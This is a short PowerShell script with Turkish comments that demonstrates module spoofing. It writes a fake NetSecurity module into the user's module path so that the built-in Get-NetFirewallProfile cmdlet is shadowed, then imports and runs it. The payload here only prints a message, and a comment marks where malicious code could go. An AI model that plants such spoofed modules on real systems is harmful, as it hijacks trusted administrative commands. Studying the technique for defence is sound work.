# Kötü amaçlı modül dosyası yaratma (örneğin kötü modül dizininde)

$spoofModulePath = "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\NetSecurity\NetSecurity.psm1"

@"
function Get-NetFirewallProfile {
    Write-Host "Bu kötü amaçlı spoofed modüldür!"
    # Burada kötü amaçlı kodlar olabilir
}
"@ | Out-File -Encoding UTF8 $spoofModulePath

# Modülü import et
Import-Module NetSecurity

# Kötü amaçlı fonksiyon çağrısı
Get-NetFirewallProfile

